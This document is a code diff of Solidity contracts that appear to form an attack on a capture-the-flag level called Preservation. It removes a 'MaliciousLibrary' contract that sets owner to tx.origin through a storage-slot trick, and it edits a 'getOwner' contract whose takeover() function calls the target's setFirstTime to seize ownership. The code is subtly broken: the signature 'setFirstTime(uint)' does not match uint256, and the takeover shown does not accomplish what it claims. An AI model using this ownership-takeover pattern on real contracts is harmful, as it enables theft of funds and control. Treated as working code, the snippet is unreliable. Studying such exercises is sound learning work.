@@ -41,27 +41,17 @@ contract LibraryContract {
 }
 */
 
-contract MaliciousLibrary {
-    uint storedTime;
-
-    function setTime(uint _time) public {
-        owner = tx.origin;
-    }
-}
-
 contract getOwner {
     Preservation public preserve;
-    address trueOwner;
+    address trueOwner = tx.origin;
 
     constructor(address _presCon) public {
         preserve = Preservation(_presCon);
-        trueOwner = preserve.owner;
     }
 
-    function takeover() returns (address success) {
+    function takeover() public returns (address success) {
         uint256 curTime = block.timestamp - 5;
-        address(preserve).call(abi.encodeWithSignature("setFirstTime(uint)", curTime);;
-        trueOwner = preserve.owner;
+        address(preserve).call(abi.encodeWithSignature("setFirstTime(uint)", curTime));
         return trueOwner;
     }
 }
